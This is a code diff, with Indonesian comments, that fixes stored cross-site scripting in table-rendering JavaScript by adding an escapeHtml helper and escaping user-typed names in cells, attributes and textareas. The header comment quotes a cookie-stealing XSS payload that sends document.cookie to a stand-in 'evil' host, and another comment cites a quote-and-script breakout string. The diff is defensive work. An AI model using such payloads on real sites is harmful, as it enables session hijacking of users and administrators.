@@ -1,3 +1,26 @@
+/**
+ * escapeHtml — pertahanan stored-XSS untuk tableModal()/tableRows() (audit keamanan, 25 Agu 2026).
+ * -------------------------------------------------------------------------------------------
+ * TEMUAN: kedua fungsi di bawah menyisipkan `row[chunk]` (nama customer, nama kota, nama
+ * fasilitas, dst — data yang DITULIS USER lewat form) langsung ke string HTML lalu dirender
+ * lewat `v-html` di 7+ ListView.vue DAN di Modal.vue (dipakai semua picker "Pilih Lokasi/
+ * Fasilitas/dst"). Tanpa escaping, seorang agent yang mengisi nama "<img src=x
+ * onerror=fetch('https://evil/steal?c='+document.cookie)>" akan menjalankan JavaScript itu di
+ * SESI SETIAP ORANG yang membuka daftar tersebut — termasuk sesi admin.
+ *
+ * Dipakai untuk isi SEL TABEL (konteks teks HTML) maupun ATRIBUT (value="...") — kelima
+ * karakter di bawah cukup untuk kedua konteks selama atributnya memakai tanda kutip ganda
+ * (semua di file ini memang begitu).
+ */
+function escapeHtml(value) {
+    return String(value == null ? '' : value)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+}
+
 function formatAngka(angka) {
     return angka.replace(/[^0-9]/g, '');
 }
@@ -101,7 +124,7 @@ function tableModal(
         <thead>
             <tr>
                 <th>No.</th>
-                ${headers.map(header => `<th>${header}</th>`).join('')}
+                ${headers.map(header => `<th>${escapeHtml(header)}</th>`).join('')}
                 ${actionUseable && actionType.length && actionParameter.length ? '<th>Action</th>' : ''}
             </tr>
         </thead><tbody>
@@ -134,12 +157,15 @@ function tableModal(
                 tableParts.push(`
                     <td>
                         <span class="badge ${badgeClass[value] || 'bg-secondary text-white'}">
-                            ${statusMap[value] || value}
+                            ${statusMap[value] || escapeHtml(value)}
                         </span>
                     </td>
                 `);
             } else {
-                tableParts.push(`<td class="${cellClass}">${value}</td>`);
+                // ★ Titik XSS utama yang diperbaiki (audit keamanan 25 Agu 2026):
+                // `value` berasal dari data yang diketik user (nama customer/kota/
+                // fasilitas dst) dan sebelumnya masuk mentah ke HTML lewat v-html.
+                tableParts.push(`<td class="${cellClass}">${escapeHtml(value)}</td>`);
             }
         });
         // **Kolom Action**
@@ -149,7 +175,10 @@ function tableModal(
                 <td> <div class="d-flex justify-content-around row" ${actionType.length > 2 ? actionType.length > 3 ? 'style="width: 18rem;"' : 'style="width: 17rem;"' : ''}>
                 <div class="col-12">
             `);
-            let actionValue = actionParameter.map(id => (row[id] || '').toString().trim()).join('|');
+            // actionParameter biasanya ID yang dibuat server (aman), tapi di beberapa
+            // picker (mis. Modal.vue) juga membawa `name` yang diketik user — di-escape
+            // supaya tidak bisa keluar dari atribut value="..." (audit keamanan 25 Agu 2026).
+            let actionValue = actionParameter.map(id => escapeHtml((row[id] || '').toString().trim())).join('|');
             let isStatusOpen = row.status === 'O';  // **Hanya untuk closed & cancel**
             // **Objek konfigurasi tombol**
             const buttonConfig = {
@@ -200,10 +229,12 @@ function tableModal(
 }
 
 function selectedButtonAdd(chunks, data, dataId, dataName, printId) {
+    // row[dataName]/row[chunk] adalah nama yang diketik user (audit keamanan
+    // 25 Agu 2026) — sama seperti tableModal(), di-escape sebelum masuk HTML.
     var tableHTML = `<div class="row">`;
     data.forEach((row, index) => {
         chunks.forEach(chunk => {
-            tableHTML += `<button value="` + row[dataId] + "|" + row[dataName] + `" name=` + printId + ` class="btn btn-secondary col-lg-12 text-white mb-2">` + row[chunk] + `</button>`;
+            tableHTML += `<button value="` + escapeHtml(row[dataId]) + "|" + escapeHtml(row[dataName]) + `" name=` + printId + ` class="btn btn-secondary col-lg-12 text-white mb-2">` + escapeHtml(row[chunk]) + `</button>`;
         });
     });
     tableHTML += `</div>`;
@@ -382,7 +413,12 @@ function tableRows(
         chunks.forEach((chunk, i) => {
             var useTextarea = (input[i] === 'textarea');
             var styleWidth = width[i] > 0 ? `style="width: ${width[i]}rem;"` : '';
-            var chunkValue = (!chunk.includes('**') && rowObj[chunk]) ? rowObj[chunk] : '';
+            // ★ Sama seperti tableModal() (audit keamanan 25 Agu 2026): chunkValue
+            // adalah data yang sebelumnya diketik user, dirender lagi di form edit
+            // lewat v-html. Di-escape supaya tidak bisa keluar dari isi <textarea>
+            // atau dari atribut value="..." (contoh nyata: nama berisi `"><script>`).
+            var chunkValueRaw = (!chunk.includes('**') && rowObj[chunk]) ? rowObj[chunk] : '';
+            var chunkValue = escapeHtml(chunkValueRaw);
             if (useTextarea) {
             parts.push(`
                 <td>
@@ -433,7 +469,7 @@ function tableRows(
                     class="form-control-sm form-check-input checkChoose"
                     type="checkbox"
                     name="checkChoose[]"
-                    value="${actionParameter.map(id => rowObj[id]).join('|')}"
+                    value="${actionParameter.map(id => escapeHtml(rowObj[id])).join('|')}"
                     ${isChecked} ${isDisabled}
                 >
                 `);
@@ -442,7 +478,7 @@ function tableRows(
                 <button
                     class="btn btn-info text-white fas fa-edit btnUpdate"
                     name="btnUpdate"
-                    value="${actionParameter.map(id => rowObj[id]).join('|')}">
+                    value="${actionParameter.map(id => escapeHtml(rowObj[id])).join('|')}">
                 </button>
                 `);
             } else if (action === 'block') {
@@ -451,7 +487,7 @@ function tableRows(
                         <button
                         class="btn btn-warning text-white fas fa-lock btnBlock"
                         name="btnBlock"
-                        value="${actionParameter.map(id => rowObj[id]).join('|') + rowObj.status}">
+                        value="${actionParameter.map(id => escapeHtml(rowObj[id])).join('|') + rowObj.status}">
                         </button>
                     `);
                 } else {
@@ -459,7 +495,7 @@ function tableRows(
                         <button
                         class="btn btn-warning text-white fas fa-unlock btnBlock"
                         name="btnBlock"
-                        value="${actionParameter.map(id => rowObj[id]).join('|') + rowObj.status}">
+                        value="${actionParameter.map(id => escapeHtml(rowObj[id])).join('|') + rowObj.status}">
                         </button>
                     `);
                 }
@@ -468,7 +504,7 @@ function tableRows(
                 <button
                     class="btn btn-danger text-white fas fa-trash btnDelete"
                     name="btnDelete"
-                    value="${actionParameter.map(id => rowObj[id]).join('|')}">
+                    value="${actionParameter.map(id => escapeHtml(rowObj[id])).join('|')}">
                 </button>
                 `);
             } else if (action === 'choose') {
@@ -476,7 +512,7 @@ function tableRows(
                 <button
                     class="btn btn-success text-white fas fa-download btnChoose"
                     name="btnChoose"
-                    value="${actionParameter.map(id => rowObj[id]).join('|')}">
+                    value="${actionParameter.map(id => escapeHtml(rowObj[id])).join('|')}">
                 </button>
                 `);
             }
@@ -591,11 +627,11 @@ function newItemForLastDelete(headers, names, chunks, data, columns, button) {
         <div class="row">
             ${chunks.map((chunk, index) => `
                 <div class="${columns[index] || 'col-sm-12'}">
-                    <label class="col-form-label">${headers[index]}</label>
+                    <label class="col-form-label">${escapeHtml(headers[index])}</label>
                     <input type="text" class="form-control form-control-lg"
                         name="${names[index]}[]"
                         id="${names[index]};${index + 1}"
-                        value="${data[chunk] || ''}" readonly />
+                        value="${escapeHtml(data[chunk] || '')}" readonly />
                 </div>
             `).join('')}
             <div class="col-sm-12 mt-2 text-right">
